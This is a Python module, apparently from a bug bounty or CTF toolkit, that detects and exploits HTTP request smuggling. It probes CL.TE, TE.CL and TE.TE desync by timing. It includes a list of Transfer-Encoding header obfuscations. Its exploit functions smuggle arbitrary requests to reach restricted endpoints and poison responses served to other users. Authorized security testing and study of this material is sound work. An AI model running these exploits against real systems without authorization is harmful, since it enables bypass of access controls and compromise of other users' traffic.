"""HTTP request smuggling detection and exploitation.

Detects and exploits CL.TE and TE.CL request smuggling vulnerabilities:
- CL.TE: Front-end uses Content-Length, back-end uses Transfer-Encoding
- TE.CL: Front-end uses Transfer-Encoding, back-end uses Content-Length
- TE.TE: Both use Transfer-Encoding but one can be obfuscated

Usage:
    from bugbounty_ctf.smuggling import SmugglingDetector

    detector = SmugglingDetector("http://target/")
    results = detector.detect()
    if results["vulnerable"]:
        detector.exploit_clte("/api/endpoint", method="POST", smuggled_body="...")
"""

from __future__ import annotations

import time
from dataclasses import dataclass, field
from typing import Any

import requests

from bugbounty_ctf.engine import SecurityScanner


@dataclass
class SmugglingResult:
    """Result from a smuggling detection or exploitation attempt."""

    vulnerable: bool = False
    technique: str = ""
    evidence: str = ""
    timing_diff: float = 0.0
    details: dict[str, Any] = field(default_factory=dict)

    def to_dict(self) -> dict[str, Any]:
        return {
            "vulnerable": self.vulnerable,
            "technique": self.technique,
            "evidence": self.evidence[:300],
            "timing_diff": self.timing_diff,
            "details": self.details,
        }


class SmugglingDetector:
    """HTTP request smuggling detection and exploitation."""

    def __init__(self, target_url: str, *, scanner: SecurityScanner | None = None) -> None:
        self.target_url = target_url.rstrip("/")
        self.scanner = scanner
        self.session = requests.Session()
        self.timeout = 10

    def detect(self) -> dict[str, Any]:
        """Run all smuggling detection tests."""
        results: list[SmugglingResult] = []

        print(f"[*] Testing HTTP request smuggling on {self.target_url}")

        for test_fn in [self.test_clte, self.test_tecl, self.test_tete]:
            try:
                result = test_fn()
                results.append(result)
                if result.vulnerable:
                    print(f"  [!] VULNERABLE: {result.technique}")
                    break
            except Exception as e:
                print(f"  [-] {test_fn.__name__} error: {e}")

        vulnerable_any = any(r.vulnerable for r in results)
        return {
            "vulnerable": vulnerable_any,
            "results": [r.to_dict() for r in results],
            "technique": next((r.technique for r in results if r.vulnerable), ""),
        }

    def test_clte(self) -> SmugglingResult:
        """CL.TE detection: front-end uses Content-Length, back-end uses Transfer-Encoding.

        Send a request with both CL and TE headers. If the back-end processes
        the TE chunked body, the remaining bytes will poison the next request.
        """
        result = SmugglingResult(technique="CL.TE")

        # Time-based detection: if back-end uses TE, it waits for the chunk terminator
        # The smuggled request never terminates, causing a timeout
        body = "0\r\n\r\nGET /smuggled HTTP/1.1\r\nHost: {}\r\n\r\n".format(
            self.target_url.split("//")[1].split("/")[0]
        )

        headers = {
            "Content-Length": str(len(body)),
            "Transfer-Encoding": "chunked",
        }

        try:
            start = time.time()
            self.session.post(
                self.target_url,
                data=body,
                headers=headers,
                timeout=self.timeout,
            )
            elapsed_normal = time.time() - start
        except requests.exceptions.Timeout:
            result.vulnerable = True
            result.evidence = "Request timed out — back-end likely using Transfer-Encoding (CL.TE)"
            result.timing_diff = self.timeout
            return result
        except Exception:
            pass

        # Second request should be affected if smuggling worked
        try:
            start = time.time()
            self.session.get(self.target_url, timeout=self.timeout)
            elapsed_second = time.time() - start

            if elapsed_second > elapsed_normal * 2:
                result.vulnerable = True
                result.evidence = (
                    f"Second request delayed ({elapsed_second:.2f}s vs {elapsed_normal:.2f}s)"
                )
                result.timing_diff = elapsed_second - elapsed_normal
        except Exception:
            pass

        return result

    def test_tecl(self) -> SmugglingResult:
        """TE.CL detection: front-end uses Transfer-Encoding, back-end uses Content-Length."""
        result = SmugglingResult(technique="TE.CL")

        body = "8\r\nSMUGGLED\r\n0\r\n\r\nGET / HTTP/1.1\r\nHost: {}\r\n\r\n".format(
            self.target_url.split("//")[1].split("/")[0]
        )

        headers = {
            "Content-Length": str(len(body)),
            "Transfer-Encoding": "chunked",
        }

        try:
            start = time.time()
            self.session.post(
                self.target_url,
                data=body,
                headers=headers,
                timeout=self.timeout,
            )
            elapsed = time.time() - start

            if elapsed > self.timeout * 0.8:
                result.vulnerable = True
                result.evidence = "Request delayed — possible TE.CL smuggling"
                result.timing_diff = elapsed
        except requests.exceptions.Timeout:
            result.vulnerable = True
            result.evidence = "Timeout — possible TE.CL smuggling"
            result.timing_diff = self.timeout
        except Exception:
            pass

        return result

    def test_tete(self) -> SmugglingResult:
        """TE.TE detection: obfuscate Transfer-Encoding to bypass front-end."""
        result = SmugglingResult(technique="TE.TE")

        obfuscations = [
            "Transfer-Encoding: chunked",
            "Transfer-Encoding: chunked\r\nTransfer-Encoding: cow",
            "Transfer-Encoding : chunked",
            "Transfer-Encoding: chunked\t",
            "Transfer-Encoding: \tchunked",
            "X: \r\nTransfer-Encoding: chunked",
            "Transfer-Encoding\r\n : chunked",
        ]

        for obf in obfuscations:
            body = "0\r\n\r\n"
            raw_headers = f"Content-Length: {len(body)}\r\n{obf}\r\n"

            try:
                import http.client

                host = self.target_url.split("//")[1].split("/")[0]
                conn = http.client.HTTPConnection(host, timeout=self.timeout)
                conn.request(
                    "POST",
                    "/",
                    body=body,
                    headers=dict(
                        h.split(": ", 1) for h in raw_headers.strip().split("\r\n") if ": " in h
                    ),
                )
                response = conn.getresponse()
                response.read()
                conn.close()

                # Check if the next request is poisoned
                conn2 = http.client.HTTPConnection(host, timeout=self.timeout)
                conn2.request("GET", "/")
                r2 = conn2.getresponse()
                body2 = r2.read().decode("utf-8", errors="replace")
                conn2.close()

                if "smuggled" in body2.lower() or r2.status != 200:
                    result.vulnerable = True
                    result.evidence = f"Obfuscation '{obf[:50]}' caused response poisoning"
                    result.details["obfuscation"] = obf
                    return result

            except Exception:
                continue

        return result

    def exploit_clte(
        self,
        path: str,
        method: str = "GET",
        smuggled_method: str = "POST",
        smuggled_body: str = "",
        smuggled_headers: dict[str, str] | None = None,
    ) -> dict[str, Any]:
        """Exploit CL.TE smuggling to access restricted endpoints."""
        host = self.target_url.split("//")[1].split("/")[0]

        smuggled_headers = smuggled_headers or {}
        smuggled_header_str = "".join(f"{k}: {v}\r\n" for k, v in smuggled_headers.items())

        smuggled_request = (
            f"{smuggled_method} {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"{smuggled_header_str}"
            f"Content-Length: {len(smuggled_body)}\r\n"
            f"\r\n"
            f"{smuggled_body}"
        )

        body = f"0\r\n\r\n{smuggled_request}"

        headers = {
            "Content-Length": str(len(body)),
            "Transfer-Encoding": "chunked",
        }

        try:
            r = self.session.post(self.target_url, data=body, headers=headers, timeout=self.timeout)
            return {
                "success": True,
                "status": r.status_code,
                "response": r.text[:500],
            }
        except Exception as e:
            return {"success": False, "error": str(e)}

    def exploit_store_response(
        self,
        smuggled_path: str,
        victim_path: str = "/",
    ) -> dict[str, Any]:
        """Exploit CL.TE to store a response that will be served to another user."""
        host = self.target_url.split("//")[1].split("/")[0]

        smuggled = f"GET {smuggled_path} HTTP/1.1\r\nHost: {host}\r\n\r\n"

        body = f"0\r\n\r\n{smuggled}"

        headers = {
            "Content-Length": str(len(body)),
            "Transfer-Encoding": "chunked",
        }

        try:
            self.session.post(self.target_url, data=body, headers=headers, timeout=self.timeout)
            time.sleep(1)

            r = self.session.get(f"{self.target_url}{victim_path}", timeout=self.timeout)
            return {
                "success": True,
                "status": r.status_code,
                "response": r.text[:500],
                "note": "Response may have been poisoned — check if content differs from normal",
            }
        except Exception as e:
            return {"success": False, "error": str(e)}
